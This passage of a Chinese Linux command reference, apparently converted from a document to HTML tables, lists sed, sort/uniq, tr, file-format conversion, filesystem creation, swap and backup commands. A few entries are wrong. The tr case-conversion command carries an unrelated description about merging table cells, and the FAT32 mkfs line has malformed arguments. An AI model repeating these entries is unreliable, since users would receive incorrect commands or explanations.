</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    合并两个文件或两栏的内容
</td></tr><tr style="height:36pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # paste -d &#39;+&#39; file1 file2
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    合并两个文件或两栏的内容，中间用<span class="s52">&quot;+&quot;</span>区分
</td></tr><tr style="height:19pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # sdiff file1 file2
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    以对比的方式显示两个文件的不同
</td></tr><tr style="height:35pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # sed &#39;s/string1/string2/g&#39; example.txt
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    将 <span class="s52">example.txt </span>文件中的<span class="s52">&quot;string1&quot; </span>替换成

&quot;string2&quot;
</td></tr><tr style="height:19pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # sed &#39;/^$/d&#39; example.txt
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    从 <span class="s52">example.txt </span>文件中删除所有空白行
</td></tr><tr style="height:19pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # sed &#39;/ *#/d; /^$/d&#39; example.txt
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    去除文件<span class="s52">example.txt </span>中的注释与空行
</td></tr><tr style="height:19pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # sed -e &#39;1d&#39; exampe.txt
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    从文件 <span class="s52">example.txt </span>中排除第一行
</td></tr><tr style="height:19pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # sed -n &#39;/string1/p&#39;
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    查看只包含词汇<span class="s52">&quot;string1&quot;</span>的行
</td></tr><tr style="height:19pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # sed -e &#39;s/ *$//&#39; example.txt
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    删除每一行最后的空白字符
</td></tr><tr style="height:36pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # sed -e &#39;s/string1//g&#39; example.txt
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    从文档中只删除词汇<span class="s52">&quot;string1&quot; </span>并保留剩余全部
</td></tr><tr style="height:19pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # sed -n &#39;1,5p&#39; example.txt
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    显示文件 <span class="s52">1 </span>至 <span class="s52">5 </span>行的内容
</td></tr></table><table style="border-collapse:collapse;margin-left:10.885pt" cellspacing="0"><tr style="height:19pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#F0F0F0">

    # sed -n &#39;5p;5q&#39; example.txt
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    显示 <span class="s52">example.txt </span>文件的第 <span class="s52">5 </span>行内容
</td></tr><tr style="height:19pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#F0F0F0">

    # sed -e &#39;s/00*/0/g&#39; example.txt
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    用单个零替换多个零
</td></tr><tr style="height:19pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#F0F0F0">

    # sort file1 file2
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    排序两个文件的内容
</td></tr><tr style="height:19pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#F0F0F0">

    # sort file1 file2 | uniq
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    取出两个文件的并集<span class="s52">(</span>重复的行只保留一份<span class="s52">)</span>
</td></tr><tr style="height:19pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#F0F0F0">

    # sort file1 file2 | uniq -u
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    删除交集，留下其他的行
</td></tr><tr style="height:36pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#F0F0F0">

    # sort file1 file2 | uniq -d
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    取出两个文件的交集<span class="s52">(</span>只留下同时存在于两个文件中的文件<span class="s52">)</span>
</td></tr><tr style="height:19pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # echo &#39;word&#39; | tr &#39;[:lower:]&#39; &#39;[:upper:]&#39;
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    合并上下单元格内容
</td></tr><tr style="height:18pt"><td style="width:405pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1" colspan="2">

    [Linux Command Line written by ](http://www.linuxguide.it/commands)[LinuxGuide.it](http://www.linuxguide.it/commands)<span style=" color: #00F; font-family:Calibri, sans-serif; font-style: normal; font-weight: normal; text-decoration: none; font-size: 11pt;"> </span>(<span class="s55">Credits</span>)
</td></tr></table>

    <table style="border-collapse:collapse;margin-left:10.885pt" cellspacing="0"><tr style="height:21pt"><td style="width:405pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1" colspan="2">

    <a name="bookmark53">字符设置和文件格式</a>
</td></tr><tr style="height:19pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#505050;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    命令
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    说明
</td></tr><tr style="height:35pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # dos2unix filedos.txt fileunix.txt
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    将一个文本文件的格式从 <span class="s52">MSDOS </span>转换成

UNIX
</td></tr><tr style="height:19pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # recode ..HTML &lt; page.txt &gt; page.html
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    将一个文本文件转换成 <span class="s52">html</span>
</td></tr><tr style="height:19pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # recode -l | more
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    显示所有允许的转换格式
</td></tr><tr style="height:35pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # unix2dos fileunix.txt filedos.txt
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    将一个文本文件的格式从 <span class="s52">UNIX </span>转换成

MSDOS
</td></tr><tr style="height:18pt"><td style="width:405pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1" colspan="2">

    [Linux Command Line written by ](http://www.linuxguide.it/commands)[LinuxGuide.it](http://www.linuxguide.it/commands)<span style=" color: #00F; font-family:Calibri, sans-serif; font-style: normal; font-weight: normal; text-decoration: none; font-size: 11pt;"> </span>(<span class="s55">Credits</span>)
</td></tr></table>

    <table style="border-collapse:collapse;margin-left:10.885pt" cellspacing="0"><tr style="height:21pt"><td style="width:405pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1" colspan="2">

    <a name="bookmark54">初始化一个文件系统</a>
</td></tr><tr style="height:19pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#505050;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    命令
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    说明
</td></tr><tr style="height:19pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # fdformat -n /dev/fd0
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    格式化一个软盘
</td></tr><tr style="height:36pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # mke2fs /dev/hda1
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    在 <span class="s52">hda1 </span>分区创建一个 <span class="s52">linux ext2 </span>的文件系统
</td></tr><tr style="height:36pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # mke2fs -j /dev/hda1
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    在 <span class="s52">hda1 </span>分区创建一个 <span class="s52">linux ext3(</span>日志型<span class="s52">)</span>的文件系统
</td></tr><tr style="height:19pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # mkfs /dev/hda1
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    在 <span class="s52">hda1 </span>分区创建一个文件系统
</td></tr><tr style="height:19pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # mkfs -t vfat 32 -F /dev/hda1
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    创建一个<span class="s52">FAT32 </span>文件系统
</td></tr><tr style="height:19pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # mkswap /dev/hda3
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    创建一个<span class="s52">swap </span>文件系统
</td></tr><tr style="height:18pt"><td style="width:405pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1" colspan="2">

    [Linux Command Line written by ](http://www.linuxguide.it/commands)[LinuxGuide.it](http://www.linuxguide.it/commands)<span style=" color: #00F; font-family:Calibri, sans-serif; font-style: normal; font-weight: normal; text-decoration: none; font-size: 11pt;"> </span>(<span class="s55">Credits</span>)
</td></tr></table>

    <table style="border-collapse:collapse;margin-left:10.885pt" cellspacing="0"><tr style="height:21pt"><td style="width:405pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1" colspan="2">

    <a name="bookmark55">SWAP </a><span class="s50">文件系统</span>
</td></tr><tr style="height:19pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#505050;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    命令
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    说明
</td></tr><tr style="height:19pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # mkswap /dev/hda3
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    创建一个<span class="s52">swap </span>文件系统
</td></tr><tr style="height:19pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # swapon /dev/hda3
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    启用一个新的 <span class="s52">swap </span>文件系统
</td></tr><tr style="height:19pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # swapon /dev/hda2 /dev/hdb3
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    启用两个<span class="s52">swap </span>分区
</td></tr><tr style="height:18pt"><td style="width:405pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1" colspan="2">

    [Linux Command Line written by ](http://www.linuxguide.it/commands)[LinuxGuide.it](http://www.linuxguide.it/commands)<span style=" color: #00F; font-family:Calibri, sans-serif; font-style: normal; font-weight: normal; text-decoration: none; font-size: 11pt;"> </span>(<span class="s55">Credits</span>)
</td></tr></table><table style="border-collapse:collapse;margin-left:10.885pt" cellspacing="0"><tr style="height:19pt"><td style="width:405pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1" colspan="2">

    <a name="bookmark56">Backup</a>
</td></tr><tr style="height:19pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#505050;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    命令
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    说明
</td></tr><tr style="height:36pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # find /var/log -name &#39;*.log&#39; | tar cv --files- from=- | bzip2 &gt; log.tar.bz2
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    查找所有以<span class="s52">&#39;.log&#39; </span>结尾的文件并做成一个

bzip <span class="s33">包</span>
